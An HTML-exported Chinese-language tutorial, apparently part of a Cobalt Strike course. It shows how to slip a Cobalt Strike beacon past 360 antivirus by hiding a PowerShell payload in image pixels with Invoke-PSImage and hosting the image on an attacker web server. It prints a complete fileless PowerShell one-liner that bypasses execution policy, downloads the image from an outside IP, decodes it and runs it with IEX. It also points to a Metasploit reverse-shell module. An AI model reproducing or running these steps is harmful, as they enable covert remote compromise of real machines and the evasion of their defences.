<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cobalt-strike-beacon-免杀上线--powershell-"><span class="csDE05BCC">Cobalt Strike beacon </span><span class="csECDA2D3">免杀上线</span><span class="csDE05BCC"> [ Powershell ]</span></a></h1>
		<p class="cs6FD73CFB"><span class="cs9C1B1871">模拟目标环境</span><span class="cs8926E06">:</span></p><p class="cs6FD73CFB"><span class="cs8926E06">AV-Server 192.168.3.58 </span><span class="cs9C1B1871">装有最新版</span><span class="cs8926E06"> 360 </span><span class="cs9C1B1871">套装</span><span class="cs8926E06"> [ </span><span class="cs9C1B1871">卫士</span><span class="cs8926E06"> + </span><span class="cs9C1B1871">杀毒</span><span class="cs8926E06"> ] 2008r2 64 </span><span class="cs9C1B1871">位系统</span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">第一步</span><span class="cs8926E06">,</span><span class="cs9C1B1871">创建监听器</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并用对应的监听器生成的</span><span class="cs8926E06"> &quot;Powershell payload &quot;</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/Cobalt%20Strike%20beacon%20%e5%85%8d%e6%9d%80%e4%b8%8a%e7%ba%bf%20[%20Powershell%20_files/image0.png" width="560" height="214" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">第二步</span><span class="cs8926E06">,</span><span class="cs9C1B1871">回到本地机器上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">先准备好一张大点的图片</span><span class="cs8926E06">,</span><span class="cs9C1B1871">比如随便去找一张</span><span class="cs8926E06">&quot;1920 * 1080&quot;</span><span class="cs9C1B1871">的超清图</span><span class="cs8926E06">,</span><span class="cs9C1B1871">之所以要大点</span><span class="cs8926E06">,</span><span class="cs9C1B1871">主要是为了防止等会儿存不</span><span class="cs8926E06"> payload,</span><span class="cs9C1B1871">然后再借助</span><span class="cs8926E06">&quot;Invoke-PSImage.ps1 &quot; </span><span class="cs9C1B1871">脚本将上面生成好的</span><span class="cs8926E06">&quot;powershell payload&quot; </span><span class="cs9C1B1871">分散存到图片的各个像素中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">并生成用于执行该</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> powershell </span><span class="cs9C1B1871">代码</span><span class="cs8926E06">,</span><span class="cs9C1B1871">特别注意下那个</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">图片链接</span><span class="cs8926E06">,</span><span class="cs9C1B1871">等会儿要把它替换成我们自己的</span><span class="cs8926E06">,</span><span class="cs9C1B1871">具体如下</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/Cobalt%20Strike%20beacon%20%e5%85%8d%e6%9d%80%e4%b8%8a%e7%ba%bf%20[%20Powershell%20_files/image1.png" width="560" height="197" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">此时</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们不妨来简单对比着看下存有</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">的图片和原图的大小</span><span class="cs8926E06">,</span><span class="cs9C1B1871">由于是把</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">分散存到图片的各个像素里</span><span class="cs8926E06">,</span><span class="cs9C1B1871">图片自身的体积也被瞬间撑大了数倍</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/Cobalt%20Strike%20beacon%20%e5%85%8d%e6%9d%80%e4%b8%8a%e7%ba%bf%20[%20Powershell%20_files/image2.png" width="560" height="357" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">第三步</span><span class="cs8926E06">,</span><span class="cs9C1B1871">将带有</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">的图片挂到我们的</span><span class="cs8926E06"> CobaltStrike &quot;web </span><span class="cs9C1B1871">服务器</span><span class="cs8926E06">[host]&quot;</span><span class="cs9C1B1871">上</span><span class="cs8926E06">,</span><span class="cs9C1B1871">生成如下链接</span><span class="cs8926E06">,</span><span class="cs9C1B1871">因为我们等会儿需要远程来加载这个链接以读取其中的</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">并执行</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/Cobalt%20Strike%20beacon%20%e5%85%8d%e6%9d%80%e4%b8%8a%e7%ba%bf%20[%20Powershell%20_files/image3.png" width="560" height="225" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">第四步</span><span class="cs8926E06">,</span><span class="cs9C1B1871">去目标机器上准备执行</span><span class="cs8926E06"> payload [ </span><span class="cs9C1B1871">全程无文件</span><span class="cs8926E06"> ],</span><span class="cs9C1B1871">此处注意</span><span class="cs8926E06">,</span><span class="cs9C1B1871">要先将用于执行</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">的那段代码里的</span><span class="cs8926E06"> payload </span><span class="cs9C1B1871">图片地址改成上面准备好的那个链接</span><span class="cs8926E06">,</span><span class="cs9C1B1871">如下</span></p><p class="cs3A447A38"><span class="cs9FB05234">C:\&gt;powershell -exec bypass</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">PS C:\&gt; sal a New-Object;Add-Type -AssemblyName &quot;System.Drawing&quot;;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead(&quot;http://18.23.76.81:80/final.png&quot;));$o=a Byte[] 3840;(0..1)|%{foreach($x</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">in(0..1919)){$p=$g.GetPixel($x,$_);$o[$_*1920+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3333]));</span></p><p class="cs40DD2BC9"><span><img src="安全工具/CobaltStrike/Cobalt_Strike_3.x系列教程/Cobalt_Strike_beacon_免杀上线/Cobalt%20Strike%20beacon%20%e5%85%8d%e6%9d%80%e4%b8%8a%e7%ba%bf%20[%20Powershell%20_files/image4.png" width="560" height="184" alt="" style="border-width:0px;" /></span></p><p class="cs6FD73CFB"><span class="cs9C1B1871">最终</span><span class="cs8926E06">,</span><span class="cs9C1B1871">当我们执行完那段</span><span class="cs8926E06">powershell </span><span class="cs9C1B1871">代码便会看到</span><span class="cs8926E06">beacon shell</span><span class="cs9C1B1871">被正常弹回</span><span class="cs8926E06">,</span><span class="cs9C1B1871">当然啦</span><span class="cs8926E06">,</span><span class="cs9C1B1871">这儿还有个很大的问题就是</span><span class="cs8926E06">,</span><span class="cs9C1B1871">实战中</span><span class="cs8926E06">,</span><span class="cs9C1B1871">我们肯定不可能像这样直接在目标桌面里打开个</span><span class="cs8926E06">cmd</span><span class="cs9C1B1871">再进到</span><span class="cs8926E06">powershell</span><span class="cs9C1B1871">去执行</span><span class="cs8926E06">payload,</span><span class="cs9C1B1871">但我此时就是想执行那段</span><span class="cs8926E06"> powershell payload </span><span class="cs9C1B1871">弹个</span><span class="cs8926E06"> beacon </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> shell </span><span class="cs9C1B1871">回来操作</span><span class="cs8926E06">,</span><span class="cs9C1B1871">又该怎么办呢</span><span class="cs8926E06">,</span><span class="cs9C1B1871">有个比较简单的办法</span><span class="cs8926E06">,</span><span class="cs9C1B1871">就是可以配合</span><span class="cs8926E06"> msf </span><span class="cs9C1B1871">一起</span><span class="cs8926E06">,</span><span class="cs9C1B1871">直接利用</span><span class="cs8926E06"> payload/cmd/windows/powershell_reverse_tcp </span><span class="cs9C1B1871">模块免杀弹回个</span><span class="cs8926E06"> ps </span><span class="cs9C1B1871">的</span><span class="cs8926E06"> shell </span><span class="cs9C1B1871">来操作就好了</span><span class="cs8926E06">,</span><span class="cs9C1B1871">具体细节篇幅原因不再多说</span><span class="cs8926E06">,</span><span class="cs9C1B1871">非常简单</span><span class="cs8926E06">,</span><span class="cs9C1B1871">作为扩展</span><span class="cs8926E06">,</span><span class="cs9C1B1871">弟兄们可以抽空自行去实践</span></p><p class="cs40DD2BC9"><span class="cs8926E06">&nbsp;</span></p></body>
</html>
